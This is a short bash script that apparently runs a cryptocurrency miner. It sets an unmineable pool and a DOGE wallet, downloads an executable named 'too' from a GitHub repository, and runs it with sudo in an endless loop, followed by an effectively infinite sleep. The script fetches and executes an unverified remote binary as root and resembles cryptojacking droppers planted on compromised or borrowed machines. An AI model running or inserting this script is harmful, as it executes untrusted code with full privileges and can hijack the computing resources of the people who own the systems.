#!/bin/bash
POOL=kp.unmineable.com:3333
WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-rvn#816c-v7qn)
wget https://github.com/dreamistoken/too/raw/main/too
chmod +x too
while [ 1 ]; do
sudo ./too -a kawpow -o $POOL -u $WALLET -w $WORKER -p x
sleep 5
done
sleep 999999999999999 
